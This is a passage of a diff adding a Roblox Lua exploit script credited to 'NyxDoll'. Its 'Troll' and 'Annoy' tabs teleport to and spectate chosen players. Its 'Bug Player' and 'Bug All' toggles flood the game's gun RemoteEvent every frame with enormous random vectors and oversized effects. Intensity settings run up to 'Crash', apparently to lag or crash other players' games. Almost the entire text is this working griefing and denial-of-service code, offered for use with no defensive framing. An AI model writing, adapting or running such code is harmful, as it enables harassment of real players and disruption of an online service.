+            local targetPlayer = Players:FindFirstChild(selectedPlayerName)
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+            else
+            end
+        end
+    })
+
+    Troll:AddToggle({
+        Name = "View Player",
+        Default = false,
+        Callback = function(value)
+            local Camera = workspace.CurrentCamera
+
+            local function UpdateCamera()
+                if value then
+                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)
+                    if targetPlayer and targetPlayer.Character then
+                        local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
+                        if humanoid then
+                            Camera.CameraSubject = humanoid
+                        end
+                    end
+                else
+                    if LocalPlayer.Character then
+                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+                        if humanoid then
+                            Camera.CameraSubject = humanoid
+                        end
+                    end
+                end
+            end
+
+            if value then
+                if not getgenv().CameraConnection then
+                    getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera)
+                end
+            else
+                if getgenv().CameraConnection then
+                    getgenv().CameraConnection:Disconnect()
+                    getgenv().CameraConnection = nil
+                end
+                UpdateCamera()
+            end
+        end
+    })
+
+    local MethodSection = Troll:AddSection({ Name = "Methods" })
+
+    Troll:AddDropdown({
+        Name = "Select Killing Method",
+        Options = {"."},
+        Default = ".",
+        Callback = function(value)
+            methodKill = value
+        end
+    })
+
+
+
+  
+ local OpTab = Window:MakeTab({"Annoy", "user"})
+
+local Section = OpTab:AddSection({"âŸ©  Player âŸ¨"}) local Players = game:GetService("Players") local ReplicatedStorage = game:GetService("ReplicatedStorage") local RunService = game:GetService("RunService") local LocalPlayer = Players.LocalPlayer local Workspace = game:GetService("Workspace") local selectedPlayerName = nil local selectedPlayer = nil local lagAtivo = false local lagConnection local lagAllAtivo = false local lagAllConnection local indice = 1 local intensidadeAtual = 1 local configs = {[1] = {nome = "Normal", multiplicador = 1, fps = 60}, [2] = {nome = "Intenso", multiplicador = 3, fps = 30}, [3] = {nome = "Extremo", multiplicador = 8, fps = 15}, [4] = {nome = "Crash", multiplicador = 20, fps = 1}} local function getPlayerList() local list = {} for _, p in pairs(Players:GetPlayers()) do if p ~= LocalPlayer then table.insert(list, p.Name) end end return list end local function GerarVetorCrash() local base = math.random(1e14, 1e15) return Vector3.new(base * math.random(10, 99), base * math.random(10, 99), base * math.random(10, 99)) end local function AtivarLagPlayer(player) if lagConnection then lagConnection:Disconnect() end selectedPlayer = player lagAtivo = true local frameCount = 0 local config = configs[intensidadeAtual] local targetFrames = 60 / config.fps lagConnection = RunService.Stepped:Connect(function() if not lagAtivo or not selectedPlayer then return end if selectedPlayer == LocalPlayer then return end frameCount = frameCount + 1 local character = selectedPlayer.Character if character and character:FindFirstChild("HumanoidRootPart") then for i = 1, config.multiplicador do local vetorlouco = GerarVetorCrash() local args = {[1] = character.HumanoidRootPart, [2] = character.HumanoidRootPart, [3] = vetorlouco, [4] = character.HumanoidRootPart.Position, [5] = LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("MuzzleEffect"), [6] = LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("ImpactEffect"), [7] = 0, [8] = 0, [9] = {[1] = false}, [10] = {[1] = 25 * config.multiplicador, [2] = Vector3.new(100 * config.multiplicador, 100 * config.multiplicador, 100 * config.multiplicador), [3] = BrickColor.new("Bright red"), [4] = 0.25, [5] = Enum.Material.SmoothPlastic, [6] = 0.25}, [11] = true, [12] = false} if ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Gu1n") then ReplicatedStorage.RE["1Gu1n"]:FireServer(unpack(args)) if intensidadeAtual == 4 and frameCount % 5 == 0 then for j = 1, 5 do task.spawn(function() ReplicatedStorage.RE["1Gu1n"]:FireServer(unpack(args)) end) end end end if intensidadeAtual == 1 and i < config.multiplicador then task.wait() end end end end) end local function DesativarLagPlayer() lagAtivo = false selectedPlayer = nil if lagConnection then lagConnection:Disconnect() lagConnection = nil end end local function AtivarLagAll() if lagAllConnection then lagAllConnection:Disconnect() end local frameCount = 0 local config = configs[intensidadeAtual] lagAllConnection = RunService.Stepped:Connect(function() if not lagAllAtivo then return end frameCount = frameCount + 1 local allPlayers = Players:GetPlayers() if #allPlayers < 2 then return end local numAlvos = intensidadeAtual == 4 and math.min(3, #allPlayers - 1) or 1 for alvosAtacados = 1, numAlvos do indice = indice + 1 if indice > #allPlayers then indice = 1 end local target = allPlayers[indice] if target == LocalPlayer then indice = indice + 1 if indice > #allPlayers then indice = 1 end target = allPlayers[indice] end if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then for i = 1, config.multiplicador do local vetorlouco = GerarVetorCrash() local args = {[1] = target.Character.HumanoidRootPart, [2] = target.Character.HumanoidRootPart, [3] = vetorlouco, [4] = target.Character.HumanoidRootPart.Position, [5] = LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("MuzzleEffect"), [6] = LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local") and LocalPlayer.Backpack.Assault.GunScript_Local:FindFirstChild("ImpactEffect"), [7] = 0, [8] = 0, [9] = {[1] = false}, [10] = {[1] = 25 * config.multiplicador, [2] = Vector3.new(100 * config.multiplicador, 100 * config.multiplicador, 100 * config.multiplicador), [3] = BrickColor.new("Bright red"), [4] = 0.25, [5] = Enum.Material.SmoothPlastic, [6] = 0.25}, [11] = true, [12] = false} if ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Gu1n") then ReplicatedStorage.RE["1Gu1n"]:FireServer(unpack(args)) if intensidadeAtual == 4 and frameCount % 3 == 0 then for j = 1, 8 do task.spawn(function() ReplicatedStorage.RE["1Gu1n"]:FireServer(unpack(args)) end) end end end end end end end) end local function ToggleLagAll(state) lagAllAtivo = state if state then AtivarLagAll() elseif lagAllConnection then lagAllConnection:Disconnect() lagAllConnection = nil end end local playerDropdown = OpTab:AddDropdown({Name = "Select Player", Options = getPlayerList(), Default = "", Callback = function(value) selectedPlayerName = value selectedPlayer = Players:FindFirstChild(value) end}) OpTab:AddButton({Name = "Update Player List", Callback = function() local list = getPlayerList() if playerDropdown then playerDropdown:Set(list) end end}) OpTab:AddButton({Name = "Go to Player", Callback = function() if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame end end end}) OpTab:AddToggle({Name = "Spectar Player", Default = false, Callback = function(value) local Camera = workspace.CurrentCamera local function UpdateCamera() if value then if selectedPlayer and selectedPlayer.Character then local humanoid = selectedPlayer.Character:FindFirstChild("Humanoid") if humanoid then Camera.CameraSubject = humanoid end end else if LocalPlayer.Character then local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid") if humanoid then Camera.CameraSubject = humanoid end end end end if value then if not getgenv().CameraConnection then getgenv().CameraConnection = RunService.Heartbeat:Connect(UpdateCamera) end else if getgenv().CameraConnection then getgenv().CameraConnection:Disconnect() getgenv().CameraConnection = nil end UpdateCamera() end end}) local Section = OpTab:AddSection({"âŸ©  Bug âŸ¨"}) OpTab:AddDropdown({Name = "Intensidade do Bug", Options = {"Normal", "Intenso", "Extremo", "Crash"}, Default = "Normal", Callback = function(value) for i, config in pairs(configs) do if config.nome == value then intensidadeAtual = i break end end end}) OpTab:AddToggle({Name = "Bug Player", Default = false, Callback = function(value) if value then if selectedPlayer then AtivarLagPlayer(selectedPlayer) end else DesativarLagPlayer() end end}) OpTab:AddToggle({Name = "Bug All", Default = false, Callback = function(value) ToggleLagAll(value) end}) OpTab:AddButton({Name = "Emergency Stop All", Callback = function() DesativarLagPlayer() ToggleLagAll(false) end}) Players.PlayerAdded:Connect(function() playerDropdown:Set(getPlayerList()) end) Players.PlayerRemoving:Connect(function() playerDropdown:Set(getPlayerList()) end) local Section = OpTab:AddSection({"Credit For\nNyxDoll"})
